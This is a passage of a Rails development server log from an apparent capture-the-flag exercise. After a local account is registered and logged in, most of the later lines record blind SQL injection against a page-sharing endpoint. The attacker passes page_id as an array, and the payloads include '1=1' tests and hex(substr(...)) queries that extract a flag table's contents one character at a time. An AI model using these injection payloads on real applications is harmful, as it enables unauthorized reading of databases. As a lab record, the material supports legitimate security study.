+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "yeraisci@mail.com"], ["LIMIT", 1]]
+  ↳ app/controllers/sessions_controller.rb:11:in `create'
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 1.5ms | Allocations: 425)
+Completed 200 OK in 359ms (Views: 3.0ms | ActiveRecord: 0.2ms | Allocations: 1642)
+
+
+Started GET "/register" for ::1 at 2021-03-29 12:15:46 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.4ms | Allocations: 941)
+Completed 200 OK in 7ms (Views: 5.2ms | ActiveRecord: 0.0ms | Allocations: 1547)
+
+
+Started POST "/users" for ::1 at 2021-03-29 12:16:02 +0800
+Processing by UsersController#create as HTML
+  Parameters: {"authenticity_token"=>"JCYEyXV3y4QblSqt3vYPlByKss2uI76AHMOpqWTyp3VNTjyG4MXkaxaFymBANtNOlmIbNa+Pa8BE7JPrrZNRZA==", "user"=>{"name"=>"bambang", "email"=>"bambang@mail.com", "password"=>"[FILTERED]", "password_confirmation"=>"[FILTERED]"}, "commit"=>"Sign up!"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "bambang@mail.com"], ["LIMIT", 1]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Create (0.2ms)[0m  [1m[32mINSERT INTO "users" ("name", "email", "password_digest", "created_at", "updated_at") VALUES (?, ?, ?, ?, ?)[0m  [["name", "bambang"], ["email", "bambang@mail.com"], ["password_digest", "$2a$12$LSje6o3VUj7kVDHYnkug4ubsz8wkqS3.WcWLZBtWAhTY8zakBxwXC"], ["created_at", "2021-03-29 04:16:03.098565"], ["updated_at", "2021-03-29 04:16:03.098565"]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[35m (2.7ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 359ms (ActiveRecord: 3.2ms | Allocations: 5204)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:16:03 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.3ms | Allocations: 941)
+Completed 200 OK in 5ms (Views: 3.6ms | ActiveRecord: 0.0ms | Allocations: 1577)
+
+
+Started GET "/login" for ::1 at 2021-03-29 12:16:04 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 2.0ms | Allocations: 428)
+Completed 200 OK in 6ms (Views: 4.3ms | ActiveRecord: 0.0ms | Allocations: 1020)
+
+
+Started POST "/login" for ::1 at 2021-03-29 12:16:11 +0800
+Processing by SessionsController#create as HTML
+  Parameters: {"authenticity_token"=>"Bu6kHyUp4slcGjXFCwIWl7+UtxN+fQIc9j8dplNr0e8fTkBLocosZOkuGKB82alKkCuCvvTl+Pd5rIrGEiRo2Q==", "login"=>{"email"=>"bambang@mail.com", "password"=>"[FILTERED]"}, "commit"=>"Log In"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "bambang@mail.com"], ["LIMIT", 1]]
+  ↳ app/controllers/sessions_controller.rb:11:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 344ms (ActiveRecord: 0.2ms | Allocations: 929)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:16:12 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.2ms | Allocations: 941)
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 6ms (Views: 4.9ms | ActiveRecord: 0.3ms | Allocations: 2264)
+
+
+Started GET "/pages/share?page_id=9" for ::1 at 2021-03-29 12:16:14 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"9"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.3ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 1.2ms | Allocations: 205)
+Completed 200 OK in 34ms (Views: 4.7ms | ActiveRecord: 1.3ms | Allocations: 9252)
+
+
+Started GET "/pages/share?page_id[]=9)%20--%20-" for ::1 at 2021-03-29 12:16:21 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["9) -- -"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.6ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (9) -- -) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.7ms | Allocations: 2178)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::RangeException: column index out of range):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=asasd" for ::1 at 2021-03-29 12:17:09 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["asasd"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.5ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (asasd) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 5ms (ActiveRecord: 0.7ms | Allocations: 2199)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: no such column: asasd):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=1=1" for ::1 at 2021-03-29 12:17:20 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=1"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+Completed 200 OK in 9ms (Views: 1.8ms | ActiveRecord: 0.7ms | Allocations: 2506)
+
+
+Started GET "/pages/share?page_id[]=1=2" for ::1 at 2021-03-29 12:17:22 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=2"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 6ms (Views: 1.4ms | ActiveRecord: 0.4ms | Allocations: 1769)
+
+
+Started GET "/pages/share?page_id[]=SELECT%20hex(substr(content,1,1))%20FROM%20ckuaks_flag%20=%20hex(%27J%27)" for ::1 at 2021-03-29 12:23:47 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["SELECT hex(substr(content,1,1)) FROM ckuaks_flag = hex('J')"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.5ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (SELECT hex(substr(content,1,1)) FROM ckuaks_flag = hex('J')) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.7ms | Allocations: 2174)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near "=": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=SELECT%20hex(substr(content,1,1))%20FROM%20ckuaks_flag%20%3d%20hex(%27J%27)" for ::1 at 2021-03-29 12:24:13 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["SELECT hex(substr(content,1,1)) FROM ckuaks_flag = hex('J')"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.5ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (SELECT hex(substr(content,1,1)) FROM ckuaks_flag = hex('J')) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.7ms | Allocations: 2152)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: near "=": syntax error):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=select%20hex(%27J%27)%3d(SELECT%20hex(substr(content,1,1))%20FROM%20ckuaks_flag)" for ::1 at 2021-03-29 12:26:05 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select hex('J')=(SELECT hex(substr(content,1,1)) FROM ckuaks_flag)"]}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.4ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select hex('J')=(SELECT hex(substr(content,1,1)) FROM ckuaks_flag)) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+Completed 404 Not Found in 6ms (ActiveRecord: 0.8ms | Allocations: 2486)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=select hex('J')=(SELECT hex(substr(content,1,1)) FROM ckuaks_flag)):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id[]=select%20hex(%27q%27)%3d(SELECT%20hex(substr(content,1,1))%20FROM%20ckuaks_flag)" for ::1 at 2021-03-29 12:26:30 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["select hex('q')=(SELECT hex(substr(content,1,1)) FROM ckuaks_flag)"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 5], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (select hex('q')=(SELECT hex(substr(content,1,1)) FROM ckuaks_flag)) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+Completed 200 OK in 5ms (Views: 1.2ms | ActiveRecord: 0.3ms | Allocations: 1766)
+
+
